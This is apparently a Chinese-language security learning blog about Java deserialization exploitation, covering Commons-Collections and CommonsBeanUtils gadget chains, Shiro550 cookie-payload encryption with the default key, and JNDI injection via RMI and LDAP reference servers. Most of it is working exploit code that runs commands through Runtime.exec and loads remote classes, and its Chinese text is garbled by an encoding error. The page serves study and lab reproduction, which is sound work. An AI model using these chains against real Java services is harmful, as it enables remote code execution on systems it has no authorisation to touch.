<p>public static void main(String[] args) throws Exception {<br>        Transformer[] transformers &#x3D; new Transformer[]{<br>                new ConstantTransformer(Runtime.class), &#x2F;&#x2F; æ„é€  setValue çš„å¯æ§å‚æ•°<br> new InvokerTransformer(â€œgetMethodâ€,<br> new Class[]{String.class, Class[].class}, new Object[]{â€œgetRuntimeâ€, null}),<br> new InvokerTransformer(â€œinvokeâ€<br> , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br> new InvokerTransformer(â€œexecâ€, new Class[]{String.class}, new Object[]{â€œcalcâ€})<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(new Transformer[]{});<br> HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;();<br> HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;();<br> Map decorateMap1 &#x3D; LazyMap.decorate(hashMap1, chainedTransformer);<br> decorateMap1.put(â€œyyâ€, 1);<br> Map decorateMap2 &#x3D; LazyMap.decorate(hashMap2, chainedTransformer);<br> decorateMap2.put(â€œzZâ€, 1);<br> Hashtable hashtable &#x3D; new Hashtable();<br> hashtable.put(decorateMap1, 1);<br> hashtable.put(decorateMap2, 1);<br> Class c &#x3D; ChainedTransformer.class;<br> Field field &#x3D; c.getDeclaredField(â€œiTransformersâ€);<br> field.setAccessible(true);<br> field.set(chainedTransformer, transformers);<br> decorateMap2.remove(â€œyyâ€);  </p>
<p> serialize(hashtable);<br> unserialize(â€œser.binâ€);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC11é“¾å­</span><br><span class="line"></span><br><span class="line">å’Œå‰é¢çš„æ€»ç»“å·®ä¸å¤šï¼Œå°±æ˜¯å¦æ‹¿å‡ºæ¥ä¸€ä¸ªå¥½ç”¨çš„</span><br><span class="line"></span><br><span class="line">å‰åŠæ®µlazyMapï¼ŒååŠæ®µConstantTransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;</p>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;</p>
<p>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.HashMap;<br>import java.util.Map;</p>
<p>public class Main {</p>
<pre><code>public static void main(String[] args) throws Exception&#123;
    byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\JavaClass\\TemplatesBytes.class&quot;));
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;);
    setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);
    setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
</code></pre>
<p>&#x2F;&#x2F;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(invokerTransformer);<br>        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();<br>&#x2F;&#x2F;        Map lazyMap &#x3D; LazyMap.decorate(hashMap, chainedTransformer);<br>        Map lazyMap &#x3D; LazyMap.decorate(hashMap, new ConstantTransformer(â€œfiveâ€)); &#x2F;&#x2F; é˜²æ­¢åœ¨ååºåˆ—åŒ–å‰å¼¹è®¡ç®—å™¨<br>        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(lazyMap, templates);<br>        HashMap&lt;Object, Object&gt; expMap &#x3D; new HashMap&lt;&gt;();<br>        expMap.put(tiedMapEntry, â€œvalueâ€);<br>        lazyMap.remove(templates);</p>
<pre><code>    // åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼
    setFieldValue(lazyMap, &quot;factory&quot;, invokerTransformer);

    serialize(expMap);
    unserialize(&quot;ser.bin&quot;);
&#125;

public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
&#125;

public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># CBé“¾å­-CommonsBeanUtils1</span><br><span class="line"></span><br><span class="line">- ä»¥ Utils ç»“å°¾ï¼Œä¸€èˆ¬è¿™éƒ½æ˜¯ä¸€ä¸ªå·¥å…·ç±»/é›†</span><br><span class="line"></span><br><span class="line"> JavaBean</span><br><span class="line"></span><br><span class="line">- å°±æ˜¯å˜é‡æ˜¯privateçš„ï¼Œå˜é‡çš„setå’Œgetæ˜¯publicçš„</span><br><span class="line">- </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;</p>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.beanutils.BeanComparator;<br>import org.apache.commons.beanutils.PropertyUtils;</p>
<p>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.PriorityQueue;</p>
<p>public class Main {<br>    public static void main(String[] args) throws Exception{<br>        byte[] code &#x3D; Files.readAllBytes(Paths.get(â€œF:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;target&#x2F;classes&#x2F;org&#x2F;example&#x2F;call.classâ€));<br>        TemplatesImpl templates &#x3D; new TemplatesImpl();<br>        setFieldValue(templates, â€œ_nameâ€, â€œCalcâ€);<br>        setFieldValue(templates, â€œ_bytecodesâ€, new byte[][] {code});<br>        setFieldValue(templates, â€œ_tfactoryâ€, new TransformerFactoryImpl());<br>        &#x2F;&#x2F;    templates.newTransformer();<br>        final BeanComparator beanComparator &#x3D; new BeanComparator();<br>        &#x2F;&#x2F; åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç <br>        final PriorityQueue<Object> queue &#x3D; new PriorityQueue<Object>(2, beanComparator);<br>        queue.add(1);<br>        queue.add(1);</p>
<pre><code>    // å°† property çš„å€¼èµ‹ä¸º outputProperties
    setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);
    setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);
    serialize(queue);
    unserialize(&quot;ser.bin&quot;);
&#125;

public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
&#125;

public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Shiro550</span><br><span class="line"></span><br><span class="line">https://www.npackd.org/p/org.apache.tomcat.Tomcat/8.5.81</span><br><span class="line"></span><br><span class="line">![image-20250210115533244](https://github.com/DDL08/images/blob/img/img/image-20250210115533244.png?raw=true)</span><br><span class="line"></span><br><span class="line">é‚£ä¸ªè¿è¡Œå˜å˜çˆ†çº¢æ²¡äº‹ï¼Œèƒ½ç”¨</span><br><span class="line"></span><br><span class="line">## ä¹±ç é—®é¢˜è§£å†³</span><br><span class="line"></span><br><span class="line">![image-20250211222159112](https://github.com/DDL08/images/blob/img/img/image-20250211222159112.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250211222229788](https://github.com/DDL08/images/blob/img/img/image-20250211222229788.png?raw=true)</span><br><span class="line"></span><br><span class="line">## æ€è·¯</span><br><span class="line"></span><br><span class="line">1. å…ˆæ˜¯æŸ¥æ‰¾è·å–cookieçš„rememberMeçš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">   - ```</span><br><span class="line">     getRememberedSerializedIdentity</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>ä»–è¢«ç±»ğŸ‘‡è°ƒç”¨</p>
<ul>
<li><pre><code>getRememberedPrincipals
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- è¿™ä¸ªç±»åœ¨è°ƒç”¨getRememberedSerializedIdentityä¹‹åæœ‰ä¸ª</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    convertBytesToPrincipals</span><br></pre></td></tr></table></figure>

- ä¼šè¿›è¡Œè§£å¯†æ“ä½œï¼ˆaesåŠ å¯†ï¼Œè·Ÿè¿›å¯æŸ¥çœ‹ï¼‰å’Œååºåˆ—åŒ–æ“ä½œ
</code></pre>
</li>
</ul>
</li>
<li><p>åŠ å¯†è¿‡ç¨‹åœ¨æ–­ç‚¹onsuccessloginé‚£ä¸ªå¯ä»¥çœ‹åˆ°</p>
</li>
</ol>
<h2 id="aesåŠ å¯†è„šæœ¬"><a href="#aesåŠ å¯†è„šæœ¬" class="headerlink" title="aesåŠ å¯†è„šæœ¬"></a>aesåŠ å¯†è„šæœ¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># ï¼*-* coding:utf-8</span><br><span class="line"># @Time    :  2022/7/13 17:36</span><br><span class="line"># @Author  : Drunkbaby</span><br><span class="line"># @FileName: poc.py</span><br><span class="line"># @Software: VSCode</span><br><span class="line"># @Blog    ï¼šhttps://drun1baby.github.io/</span><br><span class="line"></span><br><span class="line">from email.mime import base</span><br><span class="line">from pydoc import plain</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from turtle import mode</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_file_data(filename):</span><br><span class="line"> with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> return data</span><br><span class="line"></span><br><span class="line">def aes_enc(data):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().bytes</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> return ciphertext</span><br><span class="line"></span><br><span class="line">def aes_dec(enc_data):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = lambda s: s[:-s[-1]]</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:16]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[16:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> return plaintext</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"> data = get_file_data(&quot;ser.bin&quot;)</span><br><span class="line"> print(aes_enc(data))</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p>è¿™ä¸ªä¸œè¥¿æˆ‘è§‰å¾—ç›´æ¥ç”¨åˆ©ç”¨å·¥å…·å§ï¼Œ550å’Œ721å°±ä¸€ä¸ªkeyå˜æˆåŠ¨æ€ç”Ÿæˆçš„äº†</p>
<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>å…¨ç§° Remote Method Invocationï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰</p>
<p>ä¾èµ–çš„é€šä¿¡åè®®ä¸º JRMP(Java Remote Message Protocolï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Server â€”â€”â€”â€” æœåŠ¡ç«¯ï¼šæœåŠ¡ç«¯é€šè¿‡ç»‘å®šè¿œç¨‹å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å¯ä»¥å°è£…å¾ˆå¤šç½‘ç»œæ“ä½œï¼Œä¹Ÿå°±æ˜¯ Socket</span><br><span class="line"></span><br><span class="line">Client â€”â€”â€”â€” å®¢æˆ·ç«¯ï¼šå®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line">Registry â€”â€”â€”â€” æ³¨å†Œç«¯ï¼›æä¾›æœåŠ¡æ³¨å†Œä¸æœåŠ¡è·å–ã€‚å³ Server ç«¯å‘ Registry æ³¨å†ŒæœåŠ¡ï¼Œæ¯”å¦‚åœ°å€ã€ç«¯å£ç­‰ä¸€äº›ä¿¡æ¯ï¼ŒClient ç«¯ä» Registry è·å–è¿œç¨‹å¯¹è±¡çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚åœ°å€ã€ç«¯å£ç­‰ï¼Œç„¶åè¿›è¡Œè¿œç¨‹è°ƒç”¨ã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li>portè¿œç¨‹æœåŠ¡è¿™é‡Œå¦‚æœä¼ å…¥çš„æ˜¯ 0ï¼Œå®ƒä¼šè¢«å‘å¸ƒåˆ°ç½‘ç»œä¸Šçš„ä¸€ä¸ªéšæœºç«¯å£</li>
</ul>
<p>ä½¿ç”¨ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æœåŠ¡ç«¯</span><br><span class="line">RemoteObj remoteObj</span><br><span class="line">Registry registry</span><br><span class="line">å®¢æˆ·ç«¯</span><br><span class="line">åç€æ¥</span><br></pre></td></tr></table></figure>



<h2 id="dispatchå¯¹åº”å…³ç³»"><a href="#dispatchå¯¹åº”å…³ç³»" class="headerlink" title="dispatchå¯¹åº”å…³ç³»"></a>dispatchå¯¹åº”å…³ç³»</h2><ul>
<li>0 â€”â€“ bind</li>
<li>1 â€”â€“ list</li>
<li>2 â€”â€“ lookup</li>
<li>3 â€”â€“ rebind</li>
<li>4 â€”â€“ unbind</li>
</ul>
<h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>ç‰¹ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialContext</span><br><span class="line">Registry</span><br><span class="line">Reference</span><br></pre></td></tr></table></figure>

<p><strong>Java Naming and Directory Interface</strong></p>
<p>jndi åœ¨ jdk é‡Œé¢æ”¯æŒä»¥ä¸‹å››ç§æœåŠ¡</p>
<ul>
<li>LDAPï¼šè½»é‡çº§ç›®å½•è®¿é—®åè®®</li>
<li>é€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„(CORBA)ï¼›é€šç”¨å¯¹è±¡æœåŠ¡(COS)åç§°æœåŠ¡</li>
<li>Java è¿œç¨‹æ–¹æ³•è°ƒç”¨(RMI) æ³¨å†Œè¡¨</li>
<li>DNS æœåŠ¡</li>
</ul>
<p>å¯¼å…¥çš„åŒ…å…¶ä¸­æœ€é‡è¦çš„æ˜¯ <code>javax.naming</code> åŒ…ï¼ŒåŒ…å«äº†è®¿é—®ç›®å½•æœåŠ¡æ‰€éœ€çš„ç±»å’Œæ¥å£ï¼Œæ¯”å¦‚ Contextã€Bindingsã€Referencesã€lookup ç­‰ã€‚</p>
<h2 id="å¤ç°1"><a href="#å¤ç°1" class="headerlink" title="å¤ç°1"></a>å¤ç°1</h2><p>jndiçš„referenceçš„å¼•ç”¨+rmiçš„è¿œç¨‹è°ƒç”¨</p>
<p>è¿™ä¸ªæ¼æ´åœ¨ jdk8u121 å½“ä¸­è¢«ä¿®å¤ï¼Œä¹Ÿå°±æ˜¯ <code>lookup()</code> æ–¹æ³•åªå¯ä»¥å¯¹æœ¬åœ°è¿›è¡Œ <code>lookup()</code> æ–¹æ³•çš„è°ƒç”¨ã€‚</p>
<p>calc.java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class calc &#123;</span><br><span class="line">    public calc() throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class JNDIRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        //initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());</span><br><span class="line"></span><br><span class="line">        Reference reference = new Reference(&quot;calc&quot;,&quot;calc&quot;,&quot;http://localhost:7777/&quot;);</span><br><span class="line">        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>client</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class JNDIRMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        RemoteObj remoteObj = (RemoteObj) initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);</span><br><span class="line">        System.out.println(remoteObj.sayHello(&quot;hello&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŒ‚èµ·httpæœåŠ¡</p>
<h2 id="å¤ç°2"><a href="#å¤ç°2" class="headerlink" title="å¤ç°2"></a>å¤ç°2</h2><p>jndi+ladpï¼ˆä¸€ç§åè®®</p>
<p>è¿™é‡Œéœ€è¦å…ˆåœ¨ pom.xml ä¸­å¯¼å…¥ <code>unboundid-ldapsdk</code> çš„ä¾èµ–ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.0&lt;/version&gt;  </span><br><span class="line"> &lt;scope&gt;test&lt;/scope&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p><strong>LdapServer.java</strong></p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨èµ·æœåŠ¡çš„è½¯ä»¶æï¼Œå‰©ä¸‹çš„å’Œä¸Šè¾¹çš„ä¸€æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line">import com.unboundid.ldap.sdk.Entry;  </span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">import javax.net.ServerSocketFactory;  </span><br><span class="line">import javax.net.SocketFactory;  </span><br><span class="line">import javax.net.ssl.SSLSocketFactory;  </span><br><span class="line">import java.net.InetAddress;  </span><br><span class="line">import java.net.MalformedURLException;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">  </span><br><span class="line">public class LdapServer &#123;  </span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;  </span><br><span class="line"> public static void main (String[] args) &#123;  </span><br><span class="line">        String url = &quot;http://127.0.0.1:8000/#EvilObject&quot;;  </span><br><span class="line"> int port = 1234;  </span><br><span class="line"> try &#123;  </span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(new InMemoryListenerConfig(  </span><br><span class="line">                    &quot;listen&quot;,  </span><br><span class="line"> InetAddress.getByName(&quot;0.0.0.0&quot;),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  </span><br><span class="line"> InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  </span><br><span class="line"> System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        catch ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;  </span><br><span class="line">        private URL codebase;  </span><br><span class="line"> /**  </span><br><span class="line"> * */ public OperationInterceptor ( URL cb ) &#123;  </span><br><span class="line">            this.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        /**  </span><br><span class="line"> * &#123;@inheritDoc&#125;  </span><br><span class="line"> * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span><br><span class="line"> */ @Override  </span><br><span class="line"> public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;  </span><br><span class="line">            String base = result.getRequest().getBaseDN();  </span><br><span class="line"> Entry e = new Entry(base);  </span><br><span class="line"> try &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            catch ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;  </span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));  </span><br><span class="line"> System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);  </span><br><span class="line"> e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);  </span><br><span class="line"> String cbstring = this.codebase.toString();  </span><br><span class="line"> int refPos = cbstring.indexOf(&#x27;#&#x27;);  </span><br><span class="line"> if ( refPos &gt; 0 ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(0, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  